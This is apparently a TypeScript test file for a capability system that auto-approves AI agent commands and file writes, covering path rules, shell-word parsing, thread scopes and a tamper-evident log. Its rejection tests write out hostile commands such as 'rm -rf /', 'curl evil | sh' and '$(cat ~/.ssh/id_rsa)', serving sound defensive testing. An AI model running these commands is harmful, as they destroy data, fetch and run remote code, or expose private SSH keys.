import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { test } from "node:test";
import { type Capability, type Rule, addedText, readName, readRule, ruleText, scopeText, sentence, suggestName } from "../src/caps/cap.ts";
import { MAX_COMMAND, RUNNERS, joinWords, readCommandRule, splitWords } from "../src/caps/command.ts";
import { type LogEntry, type LogEvent, checkChain, eventText, nextEntry, outsideText } from "../src/caps/log.ts";
import { covers, coversResolved, requestText } from "../src/caps/match.ts";
import { MAX_PATH, PROTECTED_IN_HOME, directoryRefusal, isInside, parentDirectory, readDirectoryRule, readPath } from "../src/caps/paths.ts";
import { ancestorsOf, applies, held, holders, sourceText } from "../src/caps/scope.ts";

const PLACES = { home: "/Users/pat", dataDir: "/Users/pat/.bb" };
const sha = (text: string) => createHash("sha256").update(text).digest("hex");
const words = (command: string) => {
  const split = splitWords(command);
  return split.ok ? split.words : null;
};
const dir = (path: string): Rule => ({ kind: "dir", dir: path });
const exact = (text: string): Rule => ({ kind: "command", mode: "exact", text, words: words(text) ?? [text] });
const prefix = (text: string): Rule => {
  const read = readCommandRule(text, "prefix");
  assert.ok(read.ok, read.ok ? "" : read.why);
  return { kind: "command", mode: "prefix", text: read.text, words: read.words };
};
const files = (...paths: string[]) => ({ kind: "file_change" as const, paths });
const command = (line: string) => ({ kind: "command" as const, command: line });

// ---- paths ----------------------------------------------------------------

test("a path is read strictly: absolute, no .., nothing a shell would have to expand", () => {
  assert.deepEqual(readPath("/tmp/scratch"), { ok: true, path: "/tmp/scratch", segments: ["tmp", "scratch"] });
  assert.equal(readPath("tmp/scratch").ok, false);
  assert.equal(readPath("./scratch").ok, false);
  assert.equal(readPath("~/scratch").ok, false);
  assert.equal(readPath("").ok, false);
  assert.equal(readPath("/tmp/../etc").ok, false);
  assert.equal(readPath("/tmp/a/..").ok, false);
  assert.equal(readPath("/..").ok, false);
  assert.equal(readPath("/tmp/a\nb").ok, false);
  assert.equal(readPath("/tmp/a\u0000b").ok, false);
  assert.equal(readPath("/tmp/a\tb").ok, false);
  assert.equal(readPath(42).ok, false);
  assert.equal(readPath(null).ok, false);
});

test("repeated and trailing slashes and single dots are dropped, and nothing else changes", () => {
  assert.equal((readPath("//tmp///scratch/") as { path: string }).path, "/tmp/scratch");
  assert.equal((readPath("/tmp/./scratch/.") as { path: string }).path, "/tmp/scratch");
  assert.equal((readPath("/") as { path: string }).path, "/");
  // A name that only looks like a dot segment is a name.
  assert.equal((readPath("/tmp/...") as { path: string }).path, "/tmp/...");
  assert.equal((readPath("/tmp/..a") as { path: string }).path, "/tmp/..a");
  assert.equal((readPath("/tmp/a b") as { path: string }).path, "/tmp/a b");
});

test("an enormous path is refused, not cut", () => {
  assert.equal(readPath(`/${"a".repeat(MAX_PATH)}`).ok, false);
  assert.equal(readPath(`/${"a/".repeat(100_000)}`).ok, false);
  assert.equal(readPath(`/${"a".repeat(MAX_PATH - 1)}`).ok, true);
});

test("inside is by whole segments, never by characters, and never the directory itself", () => {
  const seg = (path: string) => (readPath(path) as { segments: string[] }).segments;
  assert.equal(isInside(seg("/a/b"), seg("/a/b/c")), true);
  assert.equal(isInside(seg("/a/b"), seg("/a/b/c/d/e")), true);
  assert.equal(isInside(seg("/a/b"), seg("/a/bc")), false);
  assert.equal(isInside(seg("/a/b"), seg("/a/bc/d")), false);
  assert.equal(isInside(seg("/a/b"), seg("/a/b")), false);
  assert.equal(isInside(seg("/a/b"), seg("/a")), false);
  assert.equal(isInside(seg("/a/b"), seg("/A/b/c")), false);
  assert.equal(isInside(seg("/a/b"), seg("/x/a/b/c")), false);
});

test("the root, the home directory and what contains it are refused", () => {
  const refused = (path: string) => readDirectoryRule(path, PLACES);
  assert.match((refused("/") as { why: string }).why, /root of the filesystem/);
  assert.match((refused("///") as { why: string }).why, /root of the filesystem/);
  assert.match((refused("/Users/pat") as { why: string }).why, /home directory/);
  assert.match((refused("/Users/pat/") as { why: string }).why, /home directory/);
  assert.match((refused("/Users") as { why: string }).why, /where home directories are kept/);
  assert.match((readDirectoryRule("/srv", { home: "/srv/people/pat", dataDir: null }) as { why: string }).why, /contains your home directory/);
  assert.equal(refused("/Users/pat/work").ok, true);
  // Another account's home is a home too; what is inside it, outside the protected places, is not.
  assert.equal(refused("/Users/patricia").ok, false);
  assert.equal(refused("/Users/patricia/work").ok, true);
  assert.equal(refused("/tmp/scratch").ok, true);
});

test("every protected place is refused: itself, anything inside it, anything that contains it", () => {
  for (const entry of PROTECTED_IN_HOME) {
    const path = `/Users/pat/${entry.path}`;
    assert.equal(readDirectoryRule(path, PLACES).ok, false, path);
    assert.equal(readDirectoryRule(`${path}/deeper/still`, PLACES).ok, false, `${path}/deeper`);
  }
  assert.match((readDirectoryRule("/Users/pat/.ssh", PLACES) as { why: string }).why, /SSH keys/);
  assert.match((readDirectoryRule("/Users/pat/.bb/plugins/cow", PLACES) as { why: string }).why, /inside \/Users\/pat\/\.bb/);
  assert.match((readDirectoryRule("/Users/pat/.local", PLACES) as { why: string }).why, /contains \/Users\/pat\/\.local\/share\/keyrings/);
  assert.match((readDirectoryRule("/Users/pat/Library", PLACES) as { why: string }).why, /contains/);
  // A name that only starts like a protected one is its own directory.
  assert.equal(readDirectoryRule("/Users/pat/.sshx", PLACES).ok, true);
  assert.equal(readDirectoryRule("/Users/pat/.configs", PLACES).ok, true);
});

test("the refusals fold case and Unicode form, because the disk does", () => {
  assert.equal(readDirectoryRule("/Users/pat/.SSH", PLACES).ok, false);
  assert.equal(readDirectoryRule("/users/PAT/.Aws/x", PLACES).ok, false);
  assert.equal(readDirectoryRule("/USERS/PAT", PLACES).ok, false);
  // é as one code point, and as e with a combining accent.
  const places = { home: "/Users/andré", dataDir: null };
  assert.equal(readDirectoryRule("/Users/andré", places).ok, false);
  assert.equal(readDirectoryRule("/Users/andré/.ssh", places).ok, false);
});

test("bb's data directory is refused wherever it is, and an unknown home refuses less, not more wrongly", () => {
  const elsewhere = { home: "/Users/pat", dataDir: "/srv/bb-data" };
  assert.equal(readDirectoryRule("/srv/bb-data/plugins/cow", elsewhere).ok, false);
  assert.equal(readDirectoryRule("/srv", elsewhere).ok, false);
  assert.equal(readDirectoryRule("/srv/other", elsewhere).ok, true);
  assert.equal(directoryRefusal(["tmp", "x"], { home: null, dataDir: null }), null);
  assert.notEqual(directoryRefusal([], { home: null, dataDir: null }), null);
});

test("any account's home, on any machine, is refused the same way, and so is root's", () => {
  // A thread may run on a machine whose home is not the server's.
  for (const path of ["/Users/sam", "/home/sam", "/home/sam/.ssh", "/Users/sam/.aws/cli", "/HOME/Sam/.Config", "/root", "/root/.ssh", "/var/root", "/private/var/root/.ssh", "/Users", "/home", "/Users/sam/Library", "/var", "/private"]) {
    assert.equal(readDirectoryRule(path, PLACES).ok, false, path);
    assert.equal(readDirectoryRule(path, { home: null, dataDir: null }).ok, false, `${path}, with no home known`);
  }
  for (const path of ["/Users/sam/work", "/home/sam/src/app", "/root/build", "/srv/reports", "/var/tmp/x", "/Users/Shared/drop", "/homework"]) {
    assert.equal(readDirectoryRule(path, PLACES).ok, true, path);
  }
  assert.match((readDirectoryRule("/home/sam", PLACES) as { why: string }).why, /a home directory/);
  assert.match((readDirectoryRule("/Users/pat", PLACES) as { why: string }).why, /your home directory/);
});

test("a directory rule is trimmed at its ends and otherwise read strictly", () => {
  assert.deepEqual(readDirectoryRule("  /tmp/scratch/  ", PLACES), { ok: true, dir: "/tmp/scratch" });
  assert.equal(readDirectoryRule("scratch", PLACES).ok, false);
  assert.equal(readDirectoryRule("/tmp/../Users/pat/.ssh", PLACES).ok, false);
  assert.equal(readDirectoryRule("", PLACES).ok, false);
});

test("the directory proposed for a file is the one it is in", () => {
  assert.equal(parentDirectory("/tmp/scratch/a.txt"), "/tmp/scratch");
  assert.equal(parentDirectory("/a.txt"), null);
  assert.equal(parentDirectory("a.txt"), null);
  assert.equal(parentDirectory("/tmp/../a.txt"), null);
});

// ---- commands ---------------------------------------------------------------

test("a plain command line splits into words; quotes join and protect", () => {
  assert.deepEqual(words("git push origin main"), ["git", "push", "origin", "main"]);
  assert.deepEqual(words("  git   push\torigin  "), ["git", "push", "origin"]);
  assert.deepEqual(words("echo 'hello world'"), ["echo", "hello world"]);
  assert.deepEqual(words('echo "hello world"'), ["echo", "hello world"]);
  assert.deepEqual(words("echo a'b c'd"), ["echo", "ab cd"]);
  assert.deepEqual(words("echo ''"), ["echo", ""]);
  assert.deepEqual(words("echo '$(rm -rf /)' '; | &'"), ["echo", "$(rm -rf /)", "; | &"]);
  assert.deepEqual(words("npm run build --flag=value -x"), ["npm", "run", "build", "--flag=value", "-x"]);
  assert.deepEqual(words("/usr/bin/git status"), ["/usr/bin/git", "status"]);
});

test("every shell operator and expansion makes a command not plain words", () => {
  for (const line of [
    "echo a; rm -rf /",
    "echo a && rm x",
    "echo a & rm x",
    "echo a | sh",
    "echo a || sh",
    "echo a > /etc/passwd",
    "echo a >> x",
    "cat < x",
    "echo `id`",
    "echo $(id)",
    "echo ${HOME}",
    "echo $HOME",
    'echo "$HOME"',
    'echo "`id`"',
    'echo "a\\"b"',
    'echo "hi!"',
    "echo a\nrm x",
    "echo a\r\nrm x",
    "echo a\\\nb",
    "echo a\\ b",
    "echo *",
    "echo ?",
    "echo [ab]",
    "echo {a,b}",
    "echo ~",
    "echo ~root/x",
    "echo #comment",
    "echo !!",
    "echo ^a^b",
    "(echo a)",
    "echo a\u0000b",
    "echo 'a\nb'",
    "echo 'unclosed",
    'echo "unclosed',
    "echo =ls",
    "",
    "   ",
    "\t",
  ]) {
    assert.equal(words(line), null, JSON.stringify(line));
  }
});

test("a leading variable assignment is refused, quoted or not; later words may hold an equals sign", () => {
  assert.equal(words("FOO=1 git push"), null);
  assert.equal(words("FOO= git push"), null);
  assert.equal(words("FOO+=1 git push"), null);
  assert.equal(words("'FOO=1' git push"), null);
  assert.equal(words('"PATH=/x" git'), null);
  assert.deepEqual(words("git -c user.name=x push"), ["git", "-c", "user.name=x", "push"]);
  assert.equal(words("'' x"), null);
});

test("non-ASCII and odd spaces are not taken as plain text outside quotes", () => {
  // A no-break space is not a separator to a shell; it would be part of a word.
  assert.equal(words("git push origin"), null);
  assert.equal(words("git push oriɡin"), null);
  assert.deepEqual(words("echo 'café'"), ["echo", "café"]);
});

test("an enormous command is refused, not cut", () => {
  assert.equal(words(`echo ${"a".repeat(MAX_COMMAND)}`), null);
  assert.equal(words("a ".repeat(3000)), null);
  assert.equal(splitWords(42).ok, false);
});

test("words join back into a line that reads as the same words", () => {
  for (const list of [["git", "push"], ["echo", "hello world"], ["echo", ""], ["echo", "it's"], ["echo", 'say "hi"'], ["echo", `both ' and "`], ["echo", "$HOME;|&"], ["echo", "=x"]]) {
    assert.deepEqual(words(joinWords(list)), list, joinWords(list));
  }
});

test("a command rule must be plain words; a prefix needs two, and may not start with a runner", () => {
  assert.deepEqual(readCommandRule(" git push origin ", "exact"), { ok: true, mode: "exact", text: "git push origin", words: ["git", "push", "origin"] });
  assert.equal(readCommandRule("echo cow", "exact").ok, true);
  assert.equal(readCommandRule("echo", "exact").ok, true);
  for (const bad of ["echo a; id", "echo a && id", "a | b", "echo > x", "cat < x", "echo `id`", "echo $(id)", "echo ${X}", "X=1 echo", "echo a\nid", ""]) {
    assert.equal(readCommandRule(bad, "exact").ok, false, `exact ${JSON.stringify(bad)}`);
    assert.equal(readCommandRule(bad, "prefix").ok, false, `prefix ${JSON.stringify(bad)}`);
  }
  assert.match((readCommandRule("git", "prefix") as { why: string }).why, /at least two words/);
  assert.deepEqual(readCommandRule("git  push   'origin'", "prefix"), { ok: true, mode: "prefix", text: "git push origin", words: ["git", "push", "origin"] });
  for (const runner of RUNNERS) {
    assert.equal(readCommandRule(`${runner} -c`, "prefix").ok, false, runner);
    assert.equal(readCommandRule(`/bin/${runner} -c`, "prefix").ok, false, `/bin/${runner}`);
  }
  // An exact rule names one command line, so a runner in it is that one line and no more.
  assert.equal(readCommandRule("env ls", "exact").ok, true);
});

// ---- covering ---------------------------------------------------------------

test("a directory rule covers file changes inside it, all of them or none", () => {
  const rule = dir("/tmp/scratch");
  assert.equal(covers(rule, files("/tmp/scratch/a.txt")).covered, true);
  assert.equal(covers(rule, files("/tmp/scratch/deep/er/a.txt")).covered, true);
  assert.equal(covers(rule, files("/tmp/scratch//a.txt", "/tmp/scratch/./b.txt")).covered, true);
  assert.equal(covers(rule, files("/tmp/scratch/a.txt", "/tmp/other/b.txt")).covered, false);
  assert.equal(covers(rule, files()).covered, false);
  assert.equal(covers(rule, files("/tmp/scratch")).covered, false);
  assert.equal(covers(rule, files("/tmp/scratch/")).covered, false);
  assert.equal(covers(rule, files("/tmp/scratchy/a.txt")).covered, false);
  assert.equal(covers(rule, files("/tmp/scratch-2/a.txt")).covered, false);
  assert.equal(covers(rule, files("/tmp/scratch.bak/a.txt")).covered, false);
  assert.equal(covers(rule, files("/tmp/Scratch/a.txt")).covered, false);
  assert.equal(covers(rule, files("/private/tmp/scratch/a.txt")).covered, false);
});

test("a path that cannot be read with certainty is never covered", () => {
  const rule = dir("/tmp/scratch");
  assert.equal(covers(rule, files("/tmp/scratch/../../etc/passwd")).covered, false);
  assert.equal(covers(rule, files("/tmp/scratch/a/../b.txt")).covered, false);
  assert.equal(covers(rule, files("scratch/a.txt")).covered, false);
  assert.equal(covers(rule, files("a.txt")).covered, false);
  assert.equal(covers(rule, files("~/a.txt")).covered, false);
  assert.equal(covers(rule, files("")).covered, false);
  assert.equal(covers(rule, files("/tmp/scratch/a\nb")).covered, false);
  assert.equal(covers(rule, files(`/tmp/scratch/${"a".repeat(5000)}`)).covered, false);
  assert.equal(covers(rule, { kind: "file_change", paths: [42 as unknown as string] }).covered, false);
  // A rule that is itself unreadable covers nothing.
  assert.equal(covers(dir("/"), files("/a")).covered, false);
  assert.equal(covers(dir("tmp"), files("/tmp/a")).covered, false);
});

test("a directory rule never covers a command, and a command rule never covers a file change", () => {
  assert.equal(covers(dir("/tmp/scratch"), command("touch /tmp/scratch/a")).covered, false);
  assert.equal(covers(exact("echo cow"), files("/tmp/scratch/a")).covered, false);
  assert.equal(covers(prefix("echo cow"), files("/tmp/scratch/a")).covered, false);
});

test("an exact rule is the command line, character for character", () => {
  const rule = exact("echo cow");
  assert.equal(covers(rule, command("echo cow")).covered, true);
  for (const other of ["echo cow ", " echo cow", "echo  cow", "echo cow\n", "echo 'cow'", "echo cow; id", "echo cow && id", "Echo cow", "echo cows", "echo", ""]) {
    assert.equal(covers(rule, command(other)).covered, false, JSON.stringify(other));
  }
});

test("a prefix rule covers plain command lines that begin with its words, by whole words", () => {
  const rule = prefix("git push origin");
  assert.equal(covers(rule, command("git push origin")).covered, true);
  assert.equal(covers(rule, command("git push origin main")).covered, true);
  assert.equal(covers(rule, command("git  push\t'origin' main --tags")).covered, true);
  assert.equal(covers(rule, command('git push "origin" main')).covered, true);
  assert.equal(covers(rule, command("git push originx")).covered, false);
  assert.equal(covers(rule, command("git push origin-evil main")).covered, false);
  assert.equal(covers(rule, command("git push")).covered, false);
  assert.equal(covers(rule, command("git pull origin")).covered, false);
  assert.equal(covers(rule, command("Git push origin")).covered, false);
  assert.equal(covers(rule, command("/usr/bin/git push origin")).covered, false);
  assert.equal(covers(rule, command("sudo git push origin")).covered, false);
});

test("an operator or expansion anywhere after a matching prefix is not covered", () => {
  const rule = prefix("git push origin");
  for (const line of [
    "git push origin main; rm -rf ~",
    "git push origin main && curl evil | sh",
    "git push origin main | tee x",
    "git push origin main > /etc/hosts",
    "git push origin $(cat ~/.ssh/id_rsa)",
    "git push origin `id`",
    "git push origin ${BRANCH}",
    "git push origin $BRANCH",
    'git push origin "$BRANCH"',
    "git push origin main\nrm -rf ~",
    "git push origin main\rrm x",
    "git push origin main &",
    "git push origin *",
    "git push origin ~/x",
    "git push origin main # then",
    "git push origin main \\\n --force",
    "FOO=1 git push origin",
    "git push origin 'unclosed",
    `git push origin ${"a".repeat(MAX_COMMAND)}`,
  ]) {
    assert.equal(covers(rule, command(line)).covered, false, JSON.stringify(line));
  }
  // The same text inside single quotes is one plain word, and is covered.
  assert.equal(covers(rule, command("git push origin 'a; b'")).covered, true);
});

test("a stored prefix rule with too few words covers nothing", () => {
  assert.equal(covers({ kind: "command", mode: "prefix", text: "git", words: ["git"] }, command("git status")).covered, false);
  assert.equal(covers(exact("echo cow"), { kind: "command", command: 42 as unknown as string }).covered, false);
});

test("with links followed, a file must really be inside where the directory really is", () => {
  const paths = ["/tmp/scratch/a.txt"];
  const real = (entries: Record<string, string>) => new Map(Object.entries(entries));
  // /tmp is itself a link: the directory and the file move together.
  assert.equal(coversResolved("/tmp/scratch", paths, real({ "/tmp/scratch": "/private/tmp/scratch", "/tmp/scratch/a.txt": "/private/tmp/scratch/a.txt" }), PLACES).covered, true);
  // A link inside the directory that leads out of it.
  assert.equal(coversResolved("/tmp/scratch", paths, real({ "/tmp/scratch": "/private/tmp/scratch", "/tmp/scratch/a.txt": "/Users/pat/.ssh/authorized_keys" }), PLACES).covered, false);
  assert.equal(coversResolved("/tmp/scratch", paths, real({ "/tmp/scratch": "/private/tmp/scratch", "/tmp/scratch/a.txt": "/private/tmp/scratchy/a.txt" }), PLACES).covered, false);
  // The directory itself is a link to a protected place.
  assert.equal(coversResolved("/tmp/scratch", paths, real({ "/tmp/scratch": "/Users/pat/.ssh", "/tmp/scratch/a.txt": "/Users/pat/.ssh/a.txt" }), PLACES).covered, false);
  // Something was not resolved: not covered.
  assert.equal(coversResolved("/tmp/scratch", paths, real({ "/tmp/scratch": "/private/tmp/scratch" }), PLACES).covered, false);
  assert.equal(coversResolved("/tmp/scratch", paths, real({}), PLACES).covered, false);
  // Nothing could be found out: the answer stands on the paths as written.
  assert.equal(coversResolved("/tmp/scratch", paths, null, PLACES).covered, true);
});

test("a request reads as a few words", () => {
  assert.equal(requestText(command("echo   cow")), "run: echo cow");
  assert.equal(requestText(files("/tmp/a", "/tmp/b", "/tmp/c")), "change /tmp/a (and 2 more)");
});

// ---- scope ------------------------------------------------------------------

const PARENTS: Record<string, string | null> = { main: null, head: "main", kid: "head", grandkid: "kid", sibling: "main", other: null };
const above = (id: string) => ancestorsOf((thread) => PARENTS[thread], id);
const cap = (id: string, scope: Capability["scope"], overrides: Partial<Capability> = {}): Capability => ({
  id,
  name: id,
  note: null,
  rule: dir("/tmp/scratch"),
  scope,
  createdAt: 1,
  via: "sheet",
  sourceThreadId: null,
  askId: null,
  deletedAt: null,
  uses: 0,
  lastUsedAt: null,
  ...overrides,
});

test("ancestors are read nearest first, and a loop ends the walk", () => {
  assert.deepEqual(above("grandkid"), ["kid", "head", "main"]);
  assert.deepEqual(above("main"), []);
  assert.deepEqual(above("nobody"), []);
  assert.deepEqual(ancestorsOf((id) => ({ a: "b", b: "a" })[id], "a"), ["b"]);
});

test("a thread scope is that thread alone", () => {
  const scope = { kind: "thread" as const, threadId: "head" };
  assert.equal(applies(scope, "head", above("head")), true);
  assert.equal(applies(scope, "kid", above("kid")), false);
  assert.equal(applies(scope, "main", above("main")), false);
});

test("a subtree scope is the thread and everything under it, at any depth, and nothing beside it", () => {
  const scope = { kind: "subtree" as const, threadId: "head" };
  assert.equal(applies(scope, "head", above("head")), true);
  assert.equal(applies(scope, "kid", above("kid")), true);
  assert.equal(applies(scope, "grandkid", above("grandkid")), true);
  assert.equal(applies(scope, "sibling", above("sibling")), false);
  assert.equal(applies(scope, "main", above("main")), false);
  assert.equal(applies(scope, "other", above("other")), false);
});

test("a Main scope is everything under that Main, and not the Main itself", () => {
  const scope = { kind: "main" as const, threadId: "main" };
  assert.equal(applies(scope, "main", above("main")), false);
  assert.equal(applies(scope, "head", above("head")), true);
  assert.equal(applies(scope, "grandkid", above("grandkid")), true);
  assert.equal(applies(scope, "other", above("other")), false);
});

test("what a thread holds says where each capability comes from; a deleted one is not held", () => {
  const all = [
    cap("cap_own", { kind: "thread", threadId: "kid" }, { createdAt: 3 }),
    cap("cap_above", { kind: "subtree", threadId: "head" }, { createdAt: 2 }),
    cap("cap_main", { kind: "main", threadId: "main" }, { createdAt: 1 }),
    cap("cap_gone", { kind: "subtree", threadId: "head" }, { deletedAt: 5 }),
    cap("cap_else", { kind: "thread", threadId: "sibling" }),
  ];
  const mine = held(all, "kid", above("kid"));
  assert.deepEqual(mine.map((entry) => [entry.capability.id, entry.source]), [
    ["cap_main", { from: "main", threadId: "main" }],
    ["cap_above", { from: "ancestor", threadId: "head" }],
    ["cap_own", { from: "itself" }],
  ]);
  assert.deepEqual(held(all, "head", above("head")).map((entry) => [entry.capability.id, entry.source.from]), [["cap_main", "main"], ["cap_above", "itself"]]);
  assert.deepEqual(held(all, "other", above("other")), []);
  assert.equal(sourceText({ from: "ancestor", threadId: "head" }, (id) => id.toUpperCase()), "from “HEAD”, above it");
});

test("the threads that lose a capability are the ones its scope takes in today", () => {
  const threads = Object.entries(PARENTS).map(([id, parentThreadId]) => ({ id, parentThreadId }));
  assert.deepEqual(holders({ kind: "thread", threadId: "kid" }, threads), ["kid"]);
  assert.deepEqual(holders({ kind: "subtree", threadId: "head" }, threads).sort(), ["grandkid", "head", "kid"]);
  assert.deepEqual(holders({ kind: "main", threadId: "main" }, threads).sort(), ["grandkid", "head", "kid", "sibling"]);
  assert.deepEqual(holders({ kind: "thread", threadId: "nobody" }, threads), []);
});

// ---- the words ----------------------------------------------------------------

test("a capability is restated in one sentence that names what and for whom", () => {
  const title = (id: string) => ({ head: "Billing", main: "Main" })[id] ?? id;
  assert.equal(
    sentence(dir("/tmp/scratch"), { kind: "subtree", threadId: "head" }, title),
    "The thread “Billing” and every thread under it, now and later, may create and change files anywhere under /tmp/scratch, each time bb asks, without asking you.",
  );
  assert.equal(sentence(exact("echo cow"), { kind: "thread", threadId: "head" }, title), "The thread “Billing”, and no other, may run exactly the command “echo cow”, each time bb asks, without asking you.");
  assert.match(sentence(prefix("git push origin"), { kind: "main", threadId: "main" }, title), /^Every thread under “Main”, now and later, may run any command line that begins with the words “git push origin”, whatever follows them/);
  assert.equal(ruleText(prefix("git push origin")), "git push origin …");
  assert.equal(scopeText({ kind: "main", threadId: "main" }, title), "every thread under “Main”, now and later");
  assert.equal(addedText({ name: "scratch", rule: dir("/tmp/scratch"), scope: { kind: "thread", threadId: "head" } }, "added", title), "capability added: scratch: /tmp/scratch for “Billing” only");
});

test("a name is required and kept to one short line; a rule is checked as typed", () => {
  assert.deepEqual(readName("  write   scratch "), { ok: true, value: "write scratch" });
  assert.equal(readName("   ").ok, false);
  assert.equal(readName("x".repeat(61)).ok, false);
  assert.equal(readRule({ kind: "dir", text: "/Users/pat/.ssh" }, PLACES).ok, false);
  assert.deepEqual(readRule({ kind: "dir", text: "/tmp/scratch/" }, PLACES), { ok: true, value: dir("/tmp/scratch") });
  assert.equal(readRule({ kind: "command", mode: "prefix", text: "bash -c" }, PLACES).ok, false);
  assert.equal(suggestName({ kind: "dir", text: "/tmp/scratch" }), "write scratch");
  assert.equal(suggestName({ kind: "command", mode: "exact", text: "git push origin main" }), "git push origin");
});

// ---- the log ------------------------------------------------------------------

const EVENTS: LogEvent[] = [
  { kind: "created", capabilityId: "cap_1", name: "scratch", summary: "capability added: scratch: /tmp/scratch for “Billing” only", via: "card", sourceThreadId: "head" },
  { kind: "auto-allowed", threadId: "head", interactionId: "pint_1", capabilityId: "cap_1", name: "scratch", what: "change /tmp/scratch/a.txt", links: "followed" },
  { kind: "outside", threadId: "kid", interactionId: "pint_2", decision: "allow_once", what: "run: echo cow" },
  { kind: "deleted", capabilityId: "cap_1", name: "scratch" },
];
const chain = (events: LogEvent[] = EVENTS) => {
  const entries: LogEntry[] = [];
  for (const event of events) entries.push(nextEntry(entries[entries.length - 1] ?? null, event, 1000 + entries.length, sha));
  return entries;
};

test("log entries are numbered from 1 and each carries the hash of the one before", () => {
  const entries = chain();
  assert.deepEqual(entries.map((entry) => entry.seq), [1, 2, 3, 4]);
  assert.equal(entries[0]!.prev, "");
  assert.equal(entries[2]!.prev, entries[1]!.hash);
  assert.deepEqual(checkChain(entries, sha), { intact: true, entries: 4 });
  assert.deepEqual(checkChain([...entries].reverse(), sha), { intact: true, entries: 4 });
  assert.deepEqual(checkChain([], sha), { intact: true, entries: 0 });
});

test("an entry taken out, changed, repeated or cut off the end shows as a break", () => {
  const entries = chain();
  const without = (index: number) => entries.filter((_, at) => at !== index);
  assert.deepEqual(checkChain(without(1), sha), { intact: false, entries: 3, at: 2, why: "entry 2 is missing" });
  assert.equal(checkChain(without(0), sha).intact, false);
  const edited = entries.map((entry, index) => (index === 1 ? { ...entry, event: { ...entry.event, name: "innocent" } as LogEvent } : entry));
  assert.deepEqual(checkChain(edited, sha), { intact: false, entries: 4, at: 2, why: "entry 2 was changed after it was written" });
  const retimed = entries.map((entry, index) => (index === 2 ? { ...entry, at: 5 } : entry));
  assert.equal(checkChain(retimed, sha).intact, false);
  assert.equal(checkChain([...entries, entries[3]!], sha).intact, false);
  // Cut off the end: only the record of where the log ended shows it.
  assert.deepEqual(checkChain(without(3), sha), { intact: true, entries: 3 });
  const cut = checkChain(without(3), sha, { seq: 4, hash: entries[3]!.hash });
  assert.equal(cut.intact, false);
  assert.match((cut as { why: string }).why, /entries after 3 are missing/);
  assert.deepEqual(checkChain(entries, sha, { seq: 4, hash: entries[3]!.hash }), { intact: true, entries: 4 });
  // A middle entry replaced by one with a recomputed hash still breaks the next one.
  const forged = nextEntry(entries[0]!, { kind: "deleted", capabilityId: "cap_9", name: "x" }, 1001, sha);
  assert.equal(checkChain([entries[0]!, forged, entries[2]!, entries[3]!], sha).intact, false);
});

test("an entry reads as a sentence, and a decision made elsewhere says where it may have been made", () => {
  const title = (id: string) => ({ head: "Billing", kid: "Refunds" })[id] ?? id;
  assert.equal(eventText(EVENTS[1]!, title), "allowed by scratch: change /tmp/scratch/a.txt · on “Billing”");
  assert.equal(eventText(EVENTS[2]!, title), "approved outside cow: run: echo cow · on “Refunds” · in bb's own view, or by another thread");
  assert.equal(outsideText("deny", "run: echo cow"), "denied outside cow: run: echo cow");
  assert.equal(outsideText("allow_for_session", "change /tmp/a"), "approved for the session outside cow: change /tmp/a");
  assert.match(eventText({ ...EVENTS[1]!, links: "not-followed" } as LogEvent, title), /symbolic links could not be followed/);
});
